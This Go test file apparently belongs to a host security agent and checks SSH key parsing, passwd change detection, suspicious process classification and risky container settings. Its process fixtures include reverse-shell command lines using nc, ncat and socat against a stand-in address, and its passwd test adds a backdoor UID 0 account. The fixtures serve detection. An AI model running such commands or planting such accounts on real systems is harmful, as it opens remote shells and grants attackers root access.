package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/styropyr0/visionary/internal/agentapi"
)

// A key made with ssh-keygen -t ed25519; ssh-keygen -lf prints this
// fingerprint for it.
const (
	testKey   = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPRN54MiE6mPIRG52Qwp4iaVQoZWzNfeNXwYdSGVL3l0"
	testKeyFP = "SHA256:Fgg5vCBjgKQaDMrRgqYpCFJ5L09TRY1O/0WBQbdQETw"
)

func TestSSHFingerprint(t *testing.T) {
	blob, err := base64.StdEncoding.DecodeString(strings.Fields(testKey)[1])
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(blob)
	want := "SHA256:" + strings.TrimRight(base64.StdEncoding.EncodeToString(sum[:]), "=")
	if got := sshFingerprint(blob); got != want || got != testKeyFP {
		t.Fatalf("fingerprint %q, want %q", got, testKeyFP)
	}
}

func TestParseAuthorizedKey(t *testing.T) {
	cases := []struct {
		line    string
		ok      bool
		comment string
	}{
		{testKey + " alice@laptop", true, "alice@laptop"},
		{testKey, true, ""},
		{"  " + testKey + " deploy key 2024  ", true, "deploy key 2024"},
		{`command="/usr/bin/rsync --server -e.LsfxC . /backup",no-pty,from="10.0.0.0/8" ` + testKey + " backup", true, "backup"},
		{`command="echo \"hi there\" ssh-rsa",no-pty ` + testKey + " quoted", true, "quoted"},
		{"restrict " + testKey + " r", true, "r"},
		{"# " + testKey + " commented out", false, ""},
		{"", false, ""},
		{"ssh-ed25519 not-base64!!", false, ""},
		{"no-pty", false, ""},
	}
	for _, c := range cases {
		k, ok := parseAuthorizedKey(c.line)
		if ok != c.ok {
			t.Fatalf("%q: ok %v", c.line, ok)
		}
		if !ok {
			continue
		}
		if k.typ != "ssh-ed25519" || k.fp != testKeyFP || k.comment != c.comment {
			t.Fatalf("%q: %+v", c.line, k)
		}
	}
}

func TestHomeOwner(t *testing.T) {
	if homeOwner("/home/bob/.ssh/authorized_keys") != "bob" || homeOwner("/root/.ssh/authorized_keys2") != "root" {
		t.Fatal("home owner")
	}
}

func TestPasswdNewRoot(t *testing.T) {
	before := "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n"
	after := before + "toor:x:0:0::/root:/bin/sh\n# old:x:0:0\n"
	was := fileState{hash: "a", roots: uid0Accounts(before)}
	now := fileState{hash: "b", roots: uid0Accounts(after)}
	if got := fileChangeDetail(&was, &now); got != "modified; new UID 0 account toor" {
		t.Fatalf("detail %q", got)
	}
	// An existing account raised to UID 0 counts too.
	now.roots = uid0Accounts(strings.Replace(before, "bob:x:1000", "bob:x:0", 1))
	if got := fileChangeDetail(&was, &now); got != "modified; new UID 0 account bob" {
		t.Fatalf("detail %q", got)
	}
	// Another change leaves the root accounts alone.
	now.roots = uid0Accounts(before + "carol:x:1001:1001::/home/carol:/bin/bash\n")
	if got := fileChangeDetail(&was, &now); got != "modified" {
		t.Fatalf("detail %q", got)
	}
}

func TestFileChangeDetail(t *testing.T) {
	base := fileState{size: 10, hash: "h", mode: 0o644}
	same := base
	modified := base
	modified.hash = "other"
	chmod := base
	chmod.mode = 0o666
	chown := base
	chown.uid = 1000
	both := modified
	both.mode = 0o600
	cases := []struct {
		was, now *fileState
		want     string
	}{
		{nil, &base, "created"},
		{&base, nil, "deleted"},
		{&base, &same, ""},
		{&base, &modified, "modified"},
		{&base, &chmod, "permissions changed"},
		{&base, &chown, "permissions changed"},
		{&base, &both, "modified, permissions changed"},
	}
	for i, c := range cases {
		if got := fileChangeDetail(c.was, c.now); got != c.want {
			t.Fatalf("case %d: %q, want %q", i, got, c.want)
		}
	}
}

func TestClassifyProcess(t *testing.T) {
	net := map[string]bool{"4242": true}
	cases := []struct {
		name string
		p    procInfo
		want []string
	}{
		{"normal", procInfo{exe: "/usr/sbin/nginx", name: "nginx", cmdline: []string{"nginx", "-g", "daemon off;"}}, nil},
		{"from tmp", procInfo{exe: "/tmp/.x/run", name: "run"}, []string{"runs from /tmp"}},
		{"from shm", procInfo{exe: "/dev/shm/a", name: "a"}, []string{"runs from /dev/shm"}},
		{"deleted in tmp", procInfo{exe: "/var/tmp/b (deleted)", name: "b"}, []string{"runs from /var/tmp", "deleted executable"}},
		{"fileless", procInfo{exe: "/memfd: (deleted)", name: "x"}, []string{"deleted executable"}},
		{"upgraded", procInfo{exe: "/usr/sbin/sshd (deleted)", name: "sshd", exeOnDisk: true}, nil},
		{"miner by name", procInfo{exe: "/usr/local/bin/xmrig", name: "XMRig"}, []string{"known miner xmrig"}},
		{"miner by exe", procInfo{exe: "/opt/kdevtmpfsi", name: "kworker"}, []string{"known miner kdevtmpfsi"}},
		{"kernel thread", procInfo{name: "kdevtmpfs"}, nil},
		{"reverse shell", procInfo{exe: "/usr/bin/bash", name: "bash", fds: []string{"socket:[4242]", "socket:[4242]"}, netSockets: net}, []string{"shell attached to a network socket"}},
		{"unix socket shell", procInfo{exe: "/usr/bin/bash", name: "bash", fds: []string{"socket:[77]", "pipe:[1]"}, netSockets: net}, nil},
		{"shell on unknown socket", procInfo{exe: "/bin/dash", name: "sh", fds: []string{"/dev/null", "socket:[9]"}}, []string{"shell attached to a network socket"}},
		{"terminal shell", procInfo{exe: "/bin/zsh", name: "zsh", fds: []string{"/dev/pts/0", "/dev/pts/0"}}, nil},
		{"nc -e", procInfo{exe: "/usr/bin/nc.traditional", name: "nc", cmdline: []string{"nc", "1.2.3.4", "4444", "-e", "/bin/sh"}}, []string{"netcat with exec"}},
		{"ncat --sh-exec", procInfo{exe: "/usr/bin/ncat", name: "ncat", cmdline: []string{"ncat", "--sh-exec=sh", "1.2.3.4", "1"}}, []string{"netcat with exec"}},
		{"socat exec", procInfo{exe: "/usr/bin/socat", name: "socat", cmdline: []string{"socat", "TCP:1.2.3.4:1", "EXEC:/bin/bash"}}, []string{"netcat with exec"}},
		{"nc plain", procInfo{exe: "/usr/bin/nc", name: "nc", cmdline: []string{"nc", "-zv", "db", "5432"}}, nil},
	}
	for _, c := range cases {
		if got := classifyProcess(c.p); !reflect.DeepEqual(got, c.want) {
			t.Fatalf("%s: %q, want %q", c.name, got, c.want)
		}
	}
}

func TestContainerRisks(t *testing.T) {
	var in inspected
	raw := `{
		"Image": "sha256:0123456789abcdef0123",
		"Config": {"User": ""},
		"HostConfig": {"Privileged": true, "NetworkMode": "host", "PidMode": "host",
			"CapAdd": ["CAP_SYS_ADMIN", "NET_ADMIN", "all"], "Binds": ["/srv/data:/data"]},
		"Mounts": [{"Source": "/var/run/docker.sock", "Destination": "/var/run/docker.sock"}]
	}`
	if err := json.Unmarshal([]byte(raw), &in); err != nil {
		t.Fatal(err)
	}
	want := []string{"privileged", "host network", "host PID", "docker socket mounted", "CAP_SYS_ADMIN", "all capabilities"}
	if got := containerRisks(in); !reflect.DeepEqual(got, want) {
		t.Fatalf("risks %q", got)
	}
	var plain inspected
	plain.HostConfig.NetworkMode = "bridge"
	plain.HostConfig.Binds = []string{"/run/docker.sock:/sock:ro"}
	if got := containerRisks(plain); !reflect.DeepEqual(got, []string{"docker socket mounted"}) {
		t.Fatalf("bind risks %q", got)
	}
	plain.HostConfig.Binds = nil
	if got := containerRisks(plain); got != nil {
		t.Fatalf("no risks %q", got)
	}
	for user, root := range map[string]bool{"": true, "0": true, "root": true, "0:0": true, "root:wheel": true, "1000": false, "app": false, "1000:0": false} {
		if runsAsRoot(user) != root {
			t.Fatalf("runsAsRoot(%q)", user)
		}
	}
}

func TestRiskTrackerOnce(t *testing.T) {
	r := newRiskTracker()
	r.add("c1", "root", agentapi.Event{Kind: "container_root"})
	r.add("c1", "root", agentapi.Event{Kind: "container_root"})
	r.add("c2", "root", agentapi.Event{Kind: "container_root"})
	if got := r.take(); len(got) != 2 || got[0].Count != 1 {
		t.Fatalf("events %+v", got)
	}
	if got := r.take(); got != nil {
		t.Fatalf("taken twice %+v", got)
	}
}
